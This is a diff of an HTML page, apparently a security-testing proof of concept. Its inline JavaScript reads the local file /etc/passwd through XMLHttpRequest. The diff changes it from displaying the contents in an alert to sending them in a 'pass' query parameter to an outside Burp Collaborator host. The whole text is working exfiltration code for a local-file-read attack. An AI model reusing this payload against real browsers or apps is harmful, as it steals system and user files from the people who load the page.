@@ -2,14 +2,28 @@
 <html>
 <head> 
 <script>
-//     var localfile = "file:///etc/passwd";
-    var localfile = "https://413en3fzle3l3w9ei88aaoxcz35tti.burpcollaborator.net";
+    var localfile = "file://etc/passwd";
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange=function()
     {
         if(xhr.readyState == 4)
         {
-            alert(xhr.responseText);
+            var curlTest = "https://tif34swo23kaklq3zxpzrde1gsmja8.burpcollaborator.net?pass=" + xhr.responseText;
+            var xhr2 = new XMLHttpRequest();
+
+            xhr2.onreadystatechange=function() {
+
+                if(xhr2.readyState == 4) {
+                    alert("ok!");
+                }
+            }
+
+            try {
+                xhr2.open("GET", curlTest, true);
+                xhr2.send();
+            } catch(ex2) {
+                alert(ex2.message);
+            }
         }
     }
     try{
